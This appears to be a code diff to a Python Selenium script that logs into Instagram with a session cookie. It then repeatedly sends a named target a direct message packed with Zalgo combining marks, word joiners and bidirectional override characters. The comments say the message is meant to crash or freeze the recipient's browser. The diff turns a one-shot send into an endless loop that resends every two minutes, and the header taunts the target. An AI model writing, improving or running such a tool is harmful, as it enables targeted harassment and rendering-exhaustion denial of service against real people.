@@ -1,30 +1,21 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (MONOLITH V2 - FIXED)
-# 📅 STATUS: DENSITY x30 | CORRECTED IMPORTS | ONE-SHOT CRASH
+# 🚀 PROJECT: PRAVEER NC (MONOLITH V4 - INFINITE)
+# 📅 STATUS: DENSITY x30 | SHADOW-REFRESH | 2-MIN LOOP
 
 import os, time, random, sys, gc
 from selenium import webdriver
 from selenium.webdriver.common.by import By
-from selenium.webdriver.common.keys import Keys  # ✅ FIXED IMPORT
+from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.options import Options
 
 def get_monolith_payload(target_name):
     """The Monolith: One message, x30 density rendering exhaustion."""
-    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n👑 STATUS: OBLITERATION\n"
-    
-    # 💥 THE 'LAYOUT TRAP' (U+2060 Word Joiner)
+    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n👑 STATUS: PERMANENT OBLITERATION\n"
     trap = "\u2060" * 80
-    
-    # 💥 DENSITY x30 (300 Zalgo marks) 
-    # This forces the browser's GPU buffer to hit its limit immediately.
     z_tower = "̸" * 300
-    
-    # 💥 BIDI RECURSION (Deep Directional Stacking)
     bidi_logic = "\u202E\u2066\u202D\u2067" * 12
     
     lines = [header]
-    
-    # 💥 80 Lines of High-Density Skyscraper
     for i in range(80):
         prefix = "\u202E" if i % 2 == 0 else "\u202D"
         lines.append(f"{prefix}{trap}{target_name.upper()}{z_tower}{bidi_logic}")
@@ -50,45 +41,56 @@ def main():
         print("❌ MISSING SECRETS")
         sys.exit(1)
 
-    driver = None
-    try:
-        print(f"🚀 DEPLOYING MONOLITH V2 FOR {target_name.upper()}...")
-        driver = get_driver()
-        driver.get("https://www.instagram.com/")
-        driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
-        driver.refresh()
-        time.sleep(10)
-        
-        driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
-        time.sleep(15)
-
+    print(f"🚀 STARTING INFINITE LOCKDOWN FOR {target_name.upper()}...")
+    
+    while True: # 🔄 THE INFINITE LOOP
+        driver = None
         try:
+            driver = get_driver()
+            driver.get("https://www.instagram.com/")
+            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
+            driver.refresh()
+            time.sleep(10)
+            
+            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
+            time.sleep(15)
+
+            # --- THE STRIKE ---
             box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
             payload = get_monolith_payload(target_name)
             
-            # Atomic Injection via JS to prevent runner-side lag
             driver.execute_script("""
-                var el = arguments[0];
-                document.execCommand('insertText', false, arguments[1]);
-                el.dispatchEvent(new Event('input', { bubbles: true }));
+                var box = arguments[0];
+                var text = arguments[1];
+                document.execCommand('insertText', false, text);
+                box.dispatchEvent(new Event('input', { bubbles: true }));
+                
+                setTimeout(function(){
+                    var enterEvent = new KeyboardEvent('keydown', {
+                        bubbles: true, cancelable: true, keyCode: 13, key: 'Enter'
+                    });
+                    box.dispatchEvent(enterEvent);
+                }, 500);
             """, box, payload)
             
-            time.sleep(2)
-            box.send_keys(Keys.ENTER)
-            print(f"💀 MONOLITH V2 LANDED | x30 DENSITY ACTIVE")
+            print(f"💀 MONOLITH LANDED | TARGET IS NOW LOCKED.")
+            time.sleep(3)
             
-            # Wait to ensure the socket stays open while the target browser chokes
-            time.sleep(60) 
-            
-        except Exception as e:
-            print(f"❌ SEND FAILED: {e}")
-
-    except Exception as e:
-        print(f"❌ ERROR: {e}")
-    finally:
-        if driver:
+            # Shadow-Mode Cleanup
+            driver.execute_script("window.stop();")
             driver.quit()
-        gc.collect()
+            driver = None
+            
+            # --- THE COOLDOWN ---
+            print(f"⏳ STANDBY: Next wave in 120 seconds...")
+            time.sleep(120) 
+
+        except Exception as e:
+            print(f"⚠️ CYCLE ERROR (Probably lag): {e}")
+            if driver: driver.quit()
+            time.sleep(10) # Quick retry if it fails
+        finally:
+            gc.collect()
 
 if __name__ == "__main__":
     main()
